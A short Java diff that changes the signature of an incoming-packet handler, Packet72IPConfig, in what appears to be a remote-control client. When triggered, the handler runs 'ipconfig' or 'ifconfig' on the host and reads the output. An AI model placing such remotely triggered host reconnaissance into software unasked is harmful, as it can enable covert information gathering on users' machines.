@@ -12,7 +12,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet72IPConfig extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		Process p = Runtime.getRuntime().exec(OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS ? "ipconfig" : "ifconfig");
 
 		BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
